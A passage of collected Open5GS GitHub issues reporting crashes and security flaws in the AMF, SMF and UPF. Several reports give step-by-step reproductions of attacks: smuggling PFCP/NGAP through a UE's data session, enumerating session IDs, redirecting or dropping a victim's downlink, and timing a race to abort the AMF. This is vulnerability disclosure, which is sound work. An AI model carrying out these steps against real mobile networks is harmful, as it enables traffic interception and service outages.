
### Expected behaviour

When VoNR call is initiated, the SMF should handle the PDU Session Modification / QoS modification procedure normally.
The expected behaviour is:
- The IMS call setup should continue after SIP INVITE / 183 Session Progress.
- The SMF should process the related PDU Session Modification procedure without aborting.
- If the requested QoS modification is unsupported or invalid, the SMF should reject it gracefully with an appropriate error response instead of crashing.
- The SMF process should remain running.

### Observed Behaviour

When initiating a VoNR call, the SMF crashes during the PDU Session Modification handling.


### eNodeB/gNodeB

srsRAN_Project  release_24_04 + USRP B210

### UE Models and versions

COST UE (REMI note 10 pro) and Remi K60

items.title: [Security] [High] AMF heap out-of-bounds access when parsing minimum-length SUCI

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

  Confirmed on v2.7.7 and current `main` as of 2026-06-01.

  ### Summary

  Open5GS AMF accepts a malformed minimum-length 5GS Mobile Identity encoded as SUCI. When the SUCI has no scheme-output bytes,
  `ogs_nas_5gs_suci_from_mobile_identity()` computes a zero-length scheme output but still passes it to the BCD conversion path.

  This results in heap out-of-bounds access during AMF SUCI parsing.

  ### Attack surface

  The issue is reachable from the AMF N2/NGAP interface before subscriber authentication.

  An attacker able to send NGAP/NAS traffic as, or through, a gNB can trigger the vulnerable parser with an `InitialUEMessage` carrying a crafted NAS Registration Request.

  I am intentionally not attaching a runnable exploit, raw packet payload, or pcap publicly. I can provide the full reproducer, packet capture, logs, sanitizer output, and proposed patch through a private channel if maintainers prefer.

  ### Technical root cause

  In `lib/nas/5gs/conv.c`, `ogs_nas_5gs_suci_from_mobile_identity()` rejects SUCI identities shorter than `OGS_NAS_5GS_MOBILE_IDENTITY_SUCI_MIN_SIZE`, but accepts an identity whose length is exactly equal to that minimum.

  That leaves:

  - `scheme_output_size == 0`
  - allocation of a one-byte output buffer
  - call into the BCD conversion routine with zero input length

  The BCD conversion path does not safely handle zero-length input and performs out-of-bounds memory access.

  ### Impact

  This is a memory-safety issue in the AMF reachable before subscriber authentication from the RAN-facing interface.

  Observed impact:

  - AddressSanitizer detects heap out-of-bounds access in the SUCI parsing path.
  - A non-ASan AMF build processes corrupted SUCI-derived data.
  - The issue should be treated at minimum as a remotely triggerable AMF memory corruption / denial-of-service risk from the N2 interface.

  Severity: High in deployments where the AMF N2 interface is reachable by untrusted or semi-trusted RAN peers.

  ### Severity / CVSS

  CVSS v3.1: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

  Base score: 7.5 (High)

  Rationale:

  - AV:N — the issue is triggered over the AMF N2/NGAP network interface.
  - AC:L — a single crafted Registration Request is sufficient; no race or heap grooming is required to trigger the out-of-bounds access.
  - PR:N — the message is processed before subscriber authentication.
  - UI:N — no user interaction is required.
  - S:U — the vulnerable component is the AMF process itself.
  - C:N / I:N — no practical information disclosure or code execution has been demonstrated.
  - A:H — the bug is a remotely reachable AMF memory-safety issue; ASan aborts on the heap out-of-bounds access, and a non-ASan build processes corrupted
  SUCI-derived data.

  This score is intentionally moderated based on the demonstrated denial-of-service / memory-corruption impact, not on potential RCE. If reliable remote code execution is demonstrated in the future, the severity should be revised to CVSS v3.1 9.8 Critical (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/
  S:U/C:H/I:H/A:H`); if exploitation requires heap grooming or favorable allocator layout, the revised score would more conservatively be 8.1 High (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`).

  ### Relationship to CVE-2024-24427

  This appears related to, but distinct from, CVE-2024-24427.

  CVE-2024-24427 describes a reachable assertion / DoS condition in older Open5GS versions when handling malformed SUCI input. The issue described here affects the v2.7.x SUCI parsing path after that class of checks was changed: the current guard rejects lengths below the structural minimum, but still accepts the exact minimum length, which leaves an empty scheme-output and reaches a heap out-of-bounds access.

  ### Expected behaviour

  The AMF should reject SUCI identities with an empty scheme-output/MSIN portion before calling conversion routines.

  Malformed SUCI input should result in a controlled NAS reject or parsing failure, not heap out-of-bounds memory access.

  ### Observed Behaviour

  A minimum-length SUCI reaches `ogs_nas_5gs_suci_from_mobile_identity()` with `scheme_output_size == 0`, then reaches the BCD conversion path and triggers heap out-of-bounds access.

  ### Additional material available privately

  I can provide:

  - minimal reproducer
  - packet capture
  - AMF logs
  - AddressSanitizer report
  - affected-version notes
  - proposed patch

items.title: [Bug]: SMF crashes on handover indication when no matching Non-3GPP session exists

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

In src/smf/s5c-handler.c, the Modify Bearer Request handler checks the Handover Indication and attempts to deactivate the old Non-3GPP session:

```
if (indication && indication->handover_indication) {
    ogs_assert(OGS_OK == smf_epc_pfcp_send_deactivation(sess,
            OGS_GTP2_CAUSE_ACCESS_CHANGED_FROM_NON_3GPP_TO_3GPP));
}
```

smf_epc_pfcp_send_deactivation() searches for a session with the same UE and APN using OGS_GTP2_RAT_TYPE_WLAN.

When no matching WLAN session exists, the function returns OGS_ERROR. This can occur when the old Non-3GPP session has already been released, when a stale Modify Bearer Request is received, or when a peer sends a Handover Indication without a corresponding Non-3GPP session.

The caller then triggers the assertion and aborts the SMF process.

1. The SMF receives a Modify Bearer Request with the Handover Indication set.
2. The request is processed as a Non-3GPP to 3GPP handover.
3. The SMF sends the Modify Bearer Response.
4. The SMF tries to deactivate the corresponding WLAN session.
5. No matching WLAN session is found.
6. smf_epc_pfcp_send_deactivation() returns OGS_ERROR.
7. The assertion in smf_s5c_handle_modify_bearer_request() aborts the SMF.

### Logs

```shell
Observed log:

[smf] ERROR: smf_sess_find_by_apn() failed
[smf] FATAL: smf_s5c_handle_modify_bearer_request:
Assertion `OGS_OK == smf_epc_pfcp_send_deactivation(...)' failed
```

### Expected behaviour

The SMF should not terminate when deactivation of the old Non-3GPP session fails.

A missing or already released WLAN session should be handled as a non-fatal cleanup failure. The SMF should log the failure and continue processing subsequent requests.

### Observed Behaviour

The SMF aborts due to an assertion failure, dropping all active SMF-managed sessions until the process is restarted.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Security Bug]: AMF accepts NGAP PathSwitchRequest without ownership check + Crashes due to race condition

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). 
Still unfixed on current main (source-checked 2026-09-04 @ `941e4cc2d`).

### Security impact

Any associated peer can re-home a live UE's NGAP context and redirect
its downlink FAR to an attacker-chosen endpoint due to a lack of ownership in the
referenced UE context. The redirection of the victim's downlink stream to 
an attacker-controlled endpoint is the confidentiality/integrity impact, and the controlled 
outage is the availability impact.

**Update: The same primitive can also be used to trigger AMF process abort with no SMF 
precondition due to race condition**

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **AMF** — NGAP PathSwitchRequest handling
(`src/amf/ngap-handler.c`, `ngap_handle_path_switch_request()`) and the
UE-context/`ran_ue` management it drives.

### Summary

`ngap_handle_path_switch_request()` resolves the target UE with a global
lookup by the AMF_UE_NGAP_ID carried in the message
(`ran_ue_find_by_amf_ue_ngap_id()`, `src/amf/ngap-handler.c:3074`) and
never verifies that the sending NGAP association is the one that
currently owns (serves) that UE context. Any associated gNB, including
a rogue gNB smuggled out of a UE data plane, can re-home a
live peer UE's NGAP context to itself by knowing or enumerating the
peer's AMF_UE_NGAP_ID. After acceptance, the AMF runs its normal 
path-switch chain: the context move is logged
([OLD]/[NEW] RAN_UE_NGAP_ID), the handler's PDU-session loop sends an
N11 SM-context update, and the SMF/UPF rewrite the victim's downlink
FAR toward the attacker's endpoint (UPF `gtp_connect() [10.45.0.9]:2152`). 
The victim's downlink was measurably cut and recovered only
when the victim re-registered (a full re-registration on a new address).

This bug can also be used to trigger a race condition assert.
1. The PathSwitchRequest handler switches the victim's context to the
   sender's gNB with no ownership check
   (`ran_ue->gnb_id = gnb->id`).
2. When that association goes down, `amf_gnb_remove()` frees the
   `amf_gnb_t` while the per-UE deactivation chain (N11/PFCP for the
   victim's live PDU sessions) is still in flight. The `ran_ue` is not
   reaped (the sweep skips it because the deactivation created new SBI
   transactions) but keeps pointing at the freed gNB.
3. A PathSwitchRequest re-claim for the victim's AMF_UE_NGAP_ID
   arriving inside that window (delta ≈ 0–1 ms observed) resolves the
   still-alive context, then `ran_ue_switch_to_gnb()` resolves the
   dangling `gnb_id` → `amf_gnb_find_by_id()` returns NULL →
   `ogs_assert(gnb)` aborts `open5gs-amfd`
   (`src/amf/context.c:1451`). amfd is left `<defunct>`; every NGAP
   service is lost until the open5gs containers restart.

These issues are still present on current main (`1f70b24c`).
The RAN-node-ownership enforcement commit `9a22baa76`
("Enforce RAN node ownership in handover handlers") adds
`source_ue->gnb_id != gnb->id` checks to the NGAP/S1AP handover handlers
but its own commit message explicitly excludes PathSwitchRequest.

### Steps to reproduce
#### Issue A: PathSwitchRequest from any peer.
Lab: Two attached UEs.
* Attacker UE `10.45.0.9`
* Benign peer UE `10.45.0.8`
* Core container `192.168.233.132` hosting both AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).

1. Attach both UEs.
2. From the attacker UE, open an SCTP association to
   `192.168.233.132:38412` with inner IP packets sent as ordinary uplink
   IP packets through the attacker's established PDU session (the UPF
   decapsulates and the kernel delivers them to the AMF, as in the PFCP
   smuggling path). AMF log: `gNB-N2 accepted[10.45.0.9]:33250 in
   ng-path module`.
3. Complete NG Setup with a gNB ID distinct from the real gNB (fake gNB
   ID 2) and the lab PLMN/TAC (001/01, TAC 1) — NGSetupResponse,
   successfulOutcome (proc 21), 54 bytes.
4. Probe PathSwitchRequest candidates (attacker-chosen RAN_UE_NGAP_ID
   5000, UserLocationInformation with the lab TAC): ErrorIndication-sweep
   the 60 unknown AMF_UE_NGAP_IDs (3–7, 10–64, PDU Session ID 1), then
   send three probes each (PDU Session IDs 1, 2, 3) to the two live IDs
   — the peer's (8) and the attacker's own (9). Record per-candidate
   responses.
5. The peer's live ID 8 with session 1 is accepted: verify the
   `[OLD]`/`[NEW]` context move in the AMF log, the UPF Session
   Modification with `gtp_connect() [10.45.0.9]:2152` two milliseconds
   later, and re-measure the peer's downlink. The attacker's own ID 9 is
   likewise accepted (context re-homed, UPF session modified) but its
   probes draw no decodable response.

#### Issue B: Crash AMF
Lab: Two attached UEs.
* Attacker UE (PDU-session address `10.45.0.2`
* Benign peer UE `imsi-001010123456790` with a live PDU session.
* Core container `192.168.233.132` hosting AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).
Script: `r8b_race.py` (attached zip; staged in the attacker UE container with
the `ueprobe` package and `pycrate`); the associations are smuggled as
ordinary uplink IP packets through the attacker's PDU session.

1. Attach both UEs (the peer's live session is what keeps its `ran_ue`
   alive through the removal).
2. From the attacker UE open association B (NG Setup, gNB ID 3), then
   association A (NG Setup, gNB ID 2). Both get NGSetupResponse
   (successfulOutcome, proc 21).
3. Re-home the peer's context onto A: PathSwitchRequest from A
   (attacker-chosen `RAN_UE_NGAP_ID` 5000, the peer's live
   `AMF_UE_NGAP_ID`, UserLocationInformation with the lab TAC) →
   PathSwitchRequestAcknowledge (proc 25).
4. SHUTDOWN A and, delta = 0, send the re-claim PathSwitchRequest for
   the peer's ID from B (single burst pre-associated, no handshake
   inside the window). The script sweeps delta 0–40 ms in 0.4 ms steps
   for robustness.
5. Detect: no response to the re-claim and a fresh NG Setup that gets
   no answer, meaning that amfd is gone. The script's liveness check is a full NG
   Setup exchange (a raw-SCTP connect alone cannot see a dead peer).

### Logs (Attached)
#### Issue A: PathSwitchRequest from any peer.
[R8-amf-pathswitch-context-hijack.zip](https://github.com/user-attachments/files/31734861/R8-amf-pathswitch-context-hijack.zip)

```shell
[amf] INFO: gNB-N2 accepted[10.45.0.9]:33250 in ng-path module
[amf] INFO: PathSwitchRequest
[amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[3]    (x60: ids 3..7 and 10..64, cause radioNetwork=14)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[8] AMF_UE_NGAP_ID[8]     (14:33:27.685 — peer's live ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[8]
[upf] DEBUG: Session Modification Request                     (14:33:27.687)
[gtp] INFO: gtp_connect() [10.45.0.9]:2152                    (14:33:27.687)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[9] AMF_UE_NGAP_ID[9]     (14:33:27.851 — attacker's own ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[9]
[upf] DEBUG: Session Modification Request                     (14:33:27.852)
```

(all lines from `q023_amf.log` and `q023_upf.log`. `q023_smf.log`'s
capture starts at 14:33:28.167, so the N11 SM-context update has no
SMF-side line; the only `POST /nsmf-pdusession/v1/sm-contexts/7/modify`
in it is at 14:34:05.777 — the association-release-phase modify for the
victim's session, after which the downlink stayed cut.)

(Each accepted path switch also logs `UE Security Capability mismatch in PathSwitchRequest`.
Per TS 33.501 6.7.3.1 comment in the handler, the AMF answers a mismatched
PathSwitchRequest with its locally stored UE security capabilities in
the PathSwitchRequestAcknowledge (`ngap-handler.c:3310-3314`).)

58 diverted GTP-U datagrams were captured on
the attacker's UDP 2152 listener (`q023_sink.jsonl`), all on the
attacker's own-session TEID 0xa5000091, none on the peer-session TEID
0xa5000081 (attacker-chosen and installed by the AMF in the victim's
downlink FAR).

#### Issue B: Crash AMF

[R8b-amf-pathswitch-context-hijack-crash.zip](https://github.com/user-attachments/files/31863769/R8b-amf-pathswitch-context-hijack-crash.zip)

Run 4 of 4 (11:09:06), verbatim from `amf.log`
(`amf-crash-r8b3-w4.log` in the zip; runs 1–3 in `amf-crash-r8b3-w1/2/3.log`):

    09/05 11:09:05.944: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:05.944: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[4] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [OLD] TAC[1] CellID[0x10] (ngap-handler.c:3104)
    09/05 11:09:05.944: [amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [NEW] TAC[1] CellID[0x10] (ngap-handler.c:3306)
    09/05 11:09:06.495: [amf] INFO: gNB-N2[10.45.0.2] connection refused!!! (amf-sm.c:882)
    09/05 11:09:06.495: [amf] INFO: [Removed] Number of gNBs is now 2 (context.c:1305)
    09/05 11:09:06.495: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:06.495: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:06.496: [amf] INFO:     [OLD] TAC[1] CellID[0x10]
    09/05 11:09:06.496: [amf] FATAL: ran_ue_switch_to_gnb: Assertion `gnb' failed. (../open5gs-src/src/amf/context.c:1451)
    09/05 11:09:06.496: [core] FATAL: backtrace() returned 11 addresses (../open5gs-src/lib/core/ogs-abort.c:37)

Four consecutive runs, identical fingerprint, delta = 0 each time:

| run | re-home | `[Removed]` | re-claim → FATAL (`context.c:1451`) |
|-----|-----------------|--------------------|--------------------------------------|
| 1   | 10:55:58.825    | 10:55:59.376       | 10:55:59.377                         |
| 2   | 11:01:26.841    | 11:01:27.391       | 11:01:27.392                         |
| 3   | 11:06:44.628    | 11:06:45.179       | 11:06:45.180                         |
| 4   | 11:09:05.944    | 11:09:06.495       | 11:09:06.496                         |

After each abort `open5gs-amfd` is `<defunct>` (zombie; no child reaper
restarts it) meaning that we get no NGAP service until the open5gs containers restart.

### Expected behaviour

The AMF must verify that the NGAP association sending a
PathSwitchRequest is the association that currently owns (serves) the
referenced UE context, and reject otherwise (cause: unexpected NGAP peer
/ unknown local UE NGAP-ID) without leaking which AMF_UE_NGAP_IDs are
live. Additionally, the AMF must never resolve a UE context to a freed gNB. The association
close and the UE-context cleanup must be ordered so no `ran_ue` can
outlive the gNB it points at. A re-claim for a context the sender does not own
should additionally fail the ownership check before any switch.
**Upstream itself applied exactly this class of ownership check to
the neighbouring handlers in `9a22baa76`.**

### Observed Behaviour
#### Issue A: PathSwitchRequest from any peer.
```c
/* src/amf/ngap-handler.c @ ee596937d — ngap_handle_path_switch_request() */
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);        /* :3074 — global lookup */
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]",
            (long long)amf_ue_ngap_id);
    r = ngap_send_error_indication(
            gnb, (uint64_t *)RAN_UE_NGAP_ID, &amf_ue_ngap_id,
            NGAP_Cause_PR_radioNetwork,
            NGAP_CauseRadioNetwork_unknown_local_UE_NGAP_ID);
    return;
}
amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
…
/* Change ran_ue to the NEW gNB after mandatory IE validation */   /* :3288 */
ran_ue_switch_to_gnb(ran_ue, gnb);                                  /* :3289 */
ogs_info("    [NEW] RAN_UE_NGAP_ID[%lld] AMF_UE_NGAP_ID[%lld] ",    /* :3291 */
    (long long)ran_ue->ran_ue_ngap_id, (long long)ran_ue->amf_ue_ngap_id);
```

The lookup is global across all gNB associations: `gnb` (the sending
association) is never compared with the context's serving gNB. The
ErrorIndication branch at `:3074-3085` is the enumeration oracle — it
distinguishes "no such UE" from "accepted" on the same ID space. After
acceptance the handler logs the `[OLD]`/`[NEW]` move and proceeds into
the N11/N4 modification chain.

#### Issue B: Crash AMF
`ogs_assert(gnb)` fails in `ran_ue_switch_to_gnb()` (`context.c:1451`)
and amfd aborts as `<defunct>` zombie and we get no NGAP service until the
containers restart.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Bug]: SMF Not validate the UE UP security policy in pathswitch request message as per 3GPP ETSI TS 133 515 V16.2.0  4.2.2.1.3

labels.name: status:needs-planning
labels.description: Issue accepted and needs planning into milestones

labels.name: type:spec-noncompliance
labels.description: Non-compliance with mandatory 3GPP specification requirements.

items.body: ### Open5GS Release, Revision, or Tag v2.7.6 ### Steps to reproduce **The SMF does not validate the UE UP Security Policy received in the Path Switch Request message during Xn handover, as mandated by 3GPP TS 33.515 v16.2.0, Section 4.2.2.1.3.** As a result, the SMF neither detects mismatches nor includes its locally stored UE UP security policy in the Path Switch Acknowledge message. This behavior may lead to a user plane security breach during handover. **Standards Reference** 3GPP ETSI TS 33.515 v16.2.0 – Section 4.2.2.1.3 The SMF shall verify that the UE's UP security policy received from the target gNB is the same as the UE's UP security policy that the SMF has locally stored. If there is a mismatch, the SMF shall send its locally stored UE's UP security policy of the corresponding PDU sessions to the target gNB in the Path Switch Acknowledge message. **Steps to Reproduce** 1. Deploy Open5GS v2.7.6 with SMF enabled. 2. Use Keysight UERANSIM to emulate UE and gNBs. 3. Establish a PDU session for the UE. 4. Trigger an Xn-based handover between source gNB and target gNB. 5. Observe the Path Switch Request message sent from the target gNB to the AMF/SMF. 6. Capture signaling using Wireshark. The below screenshot confirms the UE's UP security policy has been sent in path switch request message. [xn_handover.zip](https://github.com/user-attachments/files/24400073/xn_handover.zip) ### Logs ```shell ``` **Impact** - UE user plane traffic may continue with an incorrect or downgraded security policy after handover. - This violates 3GPP security requirements and may lead to: - Unencrypted user plane traffic - Policy inconsistency across gNBs - Potential security exposure during mobility ### Expected behaviour SMF should: 1. Validate the UE UP Security Policy received in the Path Switch Request. 2. Compare it with the locally stored UE UP Security Policy. 3. If a mismatch is detected, include the locally stored UE UP Security Policy in the Path Switch Acknowledge message, as per TS 33.515. ### Observed Behaviour 1. UE UP Security Policy is present in the Path Switch Request message. 2. SMF does not validate the received UE UP security policy against its locally stored policy. 3. SMF does not include UE UP Security Policy in the Path Switch Acknowledge, even when a mismatch should be detected. ### eNodeB/gNodeB Keysight UERANSIM ### UE Models and versions Keysight UERANSIM

items.title: [Security Bug]: UPF applies PFCP Session Modification and Session Deletion Requests from any associated peer.

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76)

### Security impact

Any associated peer (in practice: any registered UE, via the data-plane
delivery path) can, with one well-formed message per session and Cause-1
acknowledgements (no crash, no malformed input):

- **redirect or blackhole** the downlink of **every** live PDU session on the
  UPF (modification variant: UpdateFAR FORWARD + Outer Header Creation, or
  Apply Action = DROP), or
- **destroy any live PDU session** on the UPF (deletion variant: total
  user-plane DoS per session, GTP-U Error Indications to the RAN, and
  permanent CP/UP state desynchronization — the SMF continues operating on a
  session that no longer exists).

This is a full confidentiality/integrity/availability break of the user plane.

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **UPF** only — its N4 session dispatch. Inbound Session Modification and
Session Deletion Requests are resolved from the header SEID alone
(`upf_sess_find_by_upf_n4_seid()`, `src/upf/pfcp-sm.c:197`), the handlers
(`src/upf/n4-handler.c:243` modification, `src/upf/n4-handler.c:447`
deletion) only check that the session exists, the UpdateFAR applier
(`ogs_pfcp_handle_update_far`, `lib/pfcp/handler.c:1299`) applies
rebind/redirect/DROP with no ownership check, and session removal
(`src/upf/context.c:256`) never notifies the owning CP function. The SMF is
not affected by this root cause.

### Summary

For inbound PFCP Session Modification and Session Deletion Requests, the UPF
resolves the target session from the **header SEID alone** and never verifies
that the PFCP peer that sent the request is the one that owns the session.
This is one root cause with two impact variants:

- **Modification** — once a peer is associated (see the unauthenticated-association
  issue), it can modify **any** live session: re-bind the victim's FAR with Outer
  Header Creation to redirect the victim's downlink to the attacker, or set
  Apply Action = DROP to blackhole it.
- **Deletion** — it can delete **any** live PDU session with a single well-formed
  message: the UPF answers Cause 1 (Request accepted), destroys the session
  context, and never notifies the SMF. The SMF keeps the session in its own
  state indefinitely (CP/UP desync), the UPF sends GTP-U Error Indications to
  the gNB for the invalidated tunnel, and all user-plane traffic for the victim
  UE fails (100% packet loss).

Both variants use well-formed messages, get Cause 1 (Request accepted)
responses, and cause no crash.

In our lab the N4 endpoint is reachable from the data plane (PFCP datagram as
the payload of an uplink IP packet over the attacker's own PDU session; the
gNB GTP-U-encapsulates it, the UPF decapsulates it onto its own N4 socket).

### Steps to reproduce

**Variant A — cross-association session modification (multi-UE lab).**
Attacker UE `10.45.0.2`, benign peer UE `10.45.0.3` (both attached, each with
a PDU session). UPF N4 `192.168.231.132:8805`, N3 `192.168.231.132:2152`,
gNB `192.168.231.140:2152`, attacker sink `192.168.231.150:2152`.

1. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to `192.168.231.132:8805` through the PDU session. UPF answers
   Cause 1.
2. Read the peer UE's UP-SEID from the UPF log
   (`UE F-SEID[UP:0xfa0 CP:0xd2] ... IPv4[10.45.0.3]`). The UP-SEID is a small
   value from a bounded, enumerable pool.
3. Send a Session Modification Request with header SEID `0xfa0` and one
   UpdateFAR IE:

   | Field | Value (blackhole variant) |
   |---|---|
   | Header SEID | `0xfa0` (peer UE's UP-SEID) |
   | UpdateFAR (IE 10) | FAR ID 1, Apply Action = DROP (`0x0100`), no Update Forwarding Parameters |

   For the redirection variant, use Apply Action = FORWARD (`0x0200`) with an
   Update Forwarding Parameters containing Outer Header Creation
   (GTP-U/UDP/IPv4 → `192.168.231.150:2152`, TEID `0xbeef`).
4. Measure downlink delivery to the peer UE (`10.45.0.3`) before / during /
   after, from the data-network side and UE-to-UE.

**Variant B — cross-association session deletion (single-UE lab).**
Attacker UE `10.45.0.2` (attached, one PDU session), UPF N4
`192.168.230.132:8805`, N3 `192.168.230.132:2152`, gNB `192.168.230.140:2152`.

1. Attach the UE through the 5GC. The SMF-established session gets
   UP-SEID `0x686` (1670) / CP-SEID `0xee` (read from the UPF log).
2. From the attacker UE, send a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to `192.168.230.132:8805` through the PDU session. UPF answers
   Cause 1.
3. Send a series of PFCP Session Deletion Requests through the same path,
   stepping the PFCP header SEID over candidate values: 1..10, 0x684, 0x685,
   0x687, 0x688, 0x686. Each miss is answered with Cause 65 (which also
   confirms which SEIDs exist); the hit destroys the session.
4. After the deletion, ping through the victim session and watch the SMF logs.

### Logs (Attached)

[R2-upf-cross-association-session-modification-deletion.zip](https://github.com/user-attachments/files/31614946/R2-upf-cross-association-session-modification-deletion.zip)

**Variant A — modification.** The whole chain, attacker peer `10.45.0.2` vs.
the SMF peer `192.168.231.133`:

```shell
[upf] DEBUG: Merged PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-path.c:161)
[upf] DEBUG: Session Modification Request (../open5gs-src/src/upf/n4-handler.c:258)   # attributed to peer [10.45.0.2]:8805
[upf] INFO: UE F-SEID[UP:0xfa0 CP:0xd2] APN[internet] PDN-Type[1] IPv4[10.45.0.3] IPv6[] (../open5gs-src/src/upf/context.c:498)
```

`capture-n4.pcap` (DROP variant): SEIDs 1–8, 0xf9c–0xf9f, 0xfa1–0xfa4 answered
`Cause=65`; **SEID 0xfa0 answered `IE19 Cause=1 (Request accepted)`** — the
request came from peer `10.45.0.2:8805`, while the session's owning peer is
the SMF (`192.168.231.133:8805`). The response's SEID field is `0xd2` — the
victim's CP F-SEID, leaked to the attacker.

Measured effect (pcap-counted, two independent paths):

```text
N6 (data-network -> 10.45.0.3):  baseline 5/5 replies -> DROP active 5 req / 0 replies
UE-to-UE:                        baseline 5/5 -> DROP active 0/5
peer UE tun:                     completely silent during the drop window
restore (UpdateFAR FORW, same SEID 0xfa0): Cause 1 -> 5/5 replies again
```

Redirection variant (UpdateFAR FORWARD + OHC TEID `0xbeef` on the other
victim's SEID `0x700`): `ohc_redirect_capture.pcap` contains 3 UPF-originated
GTP-U packets `192.168.231.132:2152 -> 192.168.231.150:2152`, outer TEID
`0xbeef`, inner ICMP `10.45.0.2 -> 10.45.0.3` — the victim's downlink path
re-written to the attacker's sink; peer delivery 3/3 before, 0/3 after.

**Variant B — deletion.** The live session before the attack, then the deletion
burst (14 candidate SEIDs → Cause 65), the accepted hit, the UPF session
count, the SMF silence, and the post-deletion Error Indications:

```shell
08/28 14:09:18.950: [upf] INFO: [Added] Number of UPF-Sessions is now 1 (../open5gs-src/src/upf/context.c:212)
08/28 14:09:18.950: [upf] DEBUG: Session Establishment Request (../open5gs-src/src/upf/n4-handler.c:66)
08/28 14:09:18.950: [upf] INFO: UE F-SEID[UP:0x686 CP:0xee] APN[internet] PDN-Type[1] IPv4[10.45.0.2] IPv6[] (../open5gs-src/src/upf/context.c:498)
08/28 14:09:25.316: [upf] DEBUG: Session Deletion Request (../open5gs-src/src/upf/n4-handler.c:456)   # SEIDs 1..10, 0x684, 0x685, 0x687, 0x688 -> each answered Cause 65 "Session context not found"
08/28 14:09:33.096: [upf] DEBUG: Session Deletion Response (../open5gs-src/src/upf/n4-build.c:130)    # SEID 0x686 -> Cause 1 "Request accepted" + CP-SEID 0xee echoed back + Usage Report IE
08/28 14:09:33.096: [upf] INFO: [Removed] Number of UPF-sessions is now 0 (../open5gs-src/src/upf/context.c:256)
08/28 14:09:34.151: [upf] ERROR: [192.168.230.132] Send Error Indication [TEID:0x7f11] to [192.168.230.140] (../open5gs-src/src/upf/gtp-path.c:412)
```

`capture-n4.pcap` pkts 41–42: Session Deletion Request for SEID `0x686` from
`10.45.0.2:8805` → Session Deletion Response with `Cause=1 (Request accepted)`.
The session's owning peer is the SMF (`192.168.230.133:8805`); the deleting
peer is the UE address.

`logs/open5gs/smf.log` (14:09:18 – 14:09:42): no N4 session release and no SM
signalling at all — the SMF never learns that the UPF destroyed its session.

Post-deletion connectivity check: 100% packet loss.

### Expected behaviour

The UPF must check that the PFCP node that sent the Session Modification or
Session Deletion Request is the node that owns the session (the session's
recorded peer / F-SEID address). A request from a different association must
be answered with `Session context not found` (cause 65) and must not change
state. If a session is legitimately deleted, the UPF must notify the owning
CP function so it can clean up its own state.

### Observed Behaviour

Both message types dispatch through the same session lookup, which uses the
header SEID only — there is no comparison against the requesting node anywhere
downstream:

```c
/* src/upf/pfcp-sm.c — upf_pfcp_state_associated() */
if (message->h.seid_presence && message->h.seid != 0)
    sess = upf_sess_find_by_upf_n4_seid(message->h.seid);   /* <- header SEID only */
    ...
    case OGS_PFCP_SESSION_MODIFICATION_REQUEST_TYPE:
        upf_n4_handle_session_modification_request(...);
    case OGS_PFCP_SESSION_DELETION_REQUEST_TYPE:
        upf_n4_handle_session_deletion_request(
            sess, xact, &message->pfcp_session_deletion_request);
```

**Modification path.** The handler's only check is `!sess`; after that the
request is applied from any peer:

```c
/* src/upf/n4-handler.c — upf_n4_handle_session_modification_request() */
if (!sess) {
    ogs_error("No Context");
    ogs_pfcp_send_error_message(xact, 0,
            OGS_PFCP_SESSION_MODIFICATION_RESPONSE_TYPE,
            OGS_PFCP_CAUSE_SESSION_CONTEXT_NOT_FOUND, 0);   /* cause 65, only when SEID is unknown */
    return;
}
/* then applies CreatePDR/UpdatePDR/UpdateFAR/... from the request */
```

The UpdateFAR handler (`lib/pfcp/handler.c`, `ogs_pfcp_handle_update_far`)
applies FAR-ID rebind, Apply Action (FORWARD/DROP) and Outer Header Creation
without any ownership check.

**Deletion path.** The handler's only check is likewise `!sess`; the deletion
is executed and acknowledged to ANY peer:

